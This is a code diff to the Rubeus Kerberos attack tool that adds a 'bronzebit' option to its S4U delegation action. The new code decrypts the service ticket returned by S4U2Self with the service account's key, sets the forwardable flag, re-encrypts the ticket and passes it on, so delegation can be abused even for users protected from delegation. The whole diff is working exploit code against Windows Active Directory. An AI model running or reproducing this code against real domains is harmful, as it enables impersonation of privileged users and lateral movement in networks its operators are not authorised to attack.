@@ -11,7 +11,7 @@ namespace Rubeus
 {
     public class S4U
     {
-        public static void Execute(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool self = false, bool opsec = false)
+        public static void Execute(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool self = false, bool opsec = false, bool bronzebit = false)
         {
             // first retrieve a TGT for the user
             byte[] kirbiBytes = Ask.TGT(userName, domain, keyString, etype, null, false, domainController, new LUID(), false, opsec);
@@ -30,9 +30,9 @@ namespace Rubeus
             KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
 
             // execute the s4u process
-            Execute(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, tgs, targetDomainController, targetDomain, self, opsec);
+            Execute(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, tgs, targetDomainController, targetDomain, self, opsec, bronzebit, keyString, etype);
         }
-        public static void Execute(KRB_CRED kirbi, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool s = false, bool opsec = false, string requestDomain = "", string impersonateDomain = "")
+        public static void Execute(KRB_CRED kirbi, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool s = false, bool opsec = false, bool bronzebit = false, string keyString = "", Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial, string requestDomain = "", string impersonateDomain = "")
         {
             Console.WriteLine("[*] Action: S4U\r\n");
 
@@ -75,7 +75,7 @@ namespace Rubeus
                     }
                     else
                     {
-                        self = S4U2Self(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, s, opsec);
+                        self = S4U2Self(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, s, opsec, bronzebit, keyString, encType);
                     }
                     if (String.IsNullOrEmpty(targetSPN) == false)
                     {
@@ -418,7 +418,7 @@ namespace Rubeus
                 Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
             }
         }
-        private static KRB_CRED S4U2Self(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", string altService = "", bool self = false, bool opsec = false)
+        private static KRB_CRED S4U2Self(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", string altService = "", bool self = false, bool opsec = false, bool bronzebit = false, string keyString = "", Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial)
         {
             // extract out the info needed for the TGS-REQ/S4U2Self execution
             string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
@@ -469,9 +469,6 @@ namespace Rubeus
                     rep.ticket.sname.name_string.Add(altService.Split('/')[1]);
                 }
 
-                // add the ticket
-                cred.tickets.Add(rep.ticket);
-
                 // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart
 
                 KrbCredInfo info = new KrbCredInfo();
@@ -489,6 +486,31 @@ namespace Rubeus
 
                 // [3] flags
                 info.flags = encRepPart.flags;
+                if (bronzebit && !String.IsNullOrEmpty(keyString))
+                {
+                    Console.WriteLine("[*] Bronze Bit flag passed, flipping forwardable flag on. Original flags: {0}", info.flags);
+                    info.flags |= Interop.TicketFlags.forwardable;
+
+                    // get user longterm key from keyString
+                    byte[] key = Helpers.StringToByteArray(keyString);
+
+                    // decrypt and decode ticket encpart
+                    outBytes = Crypto.KerberosDecrypt(encType, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, key, rep.ticket.enc_part.cipher);
+                    ae = AsnElt.Decode(outBytes, false);
+                    EncTicketPart decTicketPart = new EncTicketPart(ae.Sub[0]);
+
+                    // modify flags
+                    decTicketPart.flags |= Interop.TicketFlags.forwardable;
+
+                    // encode and encrypt ticket encpart
+                    byte[] encTicketData = decTicketPart.Encode().Encode();
+                    byte[] encTicketPart = Crypto.KerberosEncrypt(encType, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, key, encTicketData);
+                    rep.ticket.enc_part = new EncryptedData((Int32)encType, encTicketPart, rep.ticket.enc_part.kvno);
+                    Console.WriteLine("[*] Flags changed to: {0}", info.flags);
+                }
+                
+                // add the ticket
+                cred.tickets.Add(rep.ticket);
 
                 // [4] authtime (not required)
 
